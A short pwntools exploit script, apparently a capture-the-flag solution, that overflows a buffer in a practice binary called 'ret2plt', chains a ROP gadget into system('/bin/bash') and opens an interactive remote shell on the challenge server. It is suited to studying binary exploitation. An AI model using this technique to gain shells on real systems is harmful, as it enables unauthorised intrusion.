from pwn import *
context.binary = elf = ELF('./ret2plt', checksec=False)

# python3 -c "from pwn import *; print(cyclic(200))"
OFFSET_TO_RIP = 72

# ROPgadget --binary ./ret2plt  | grep ": ret$" 
ret_gadget = 0x40101a
pop_rdi = 0x000000000040121f
binbash = 0x402017
system = 0x004010a0

p = remote("offsec.m0lecon.it", 13512)
p.recvuntil(b"order?\n")
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(pop_rdi),
    p64(binbash),
    p64(system),
)
p.send(payload)
p.sendline(b"/bin/sh -i")
p.interactive()
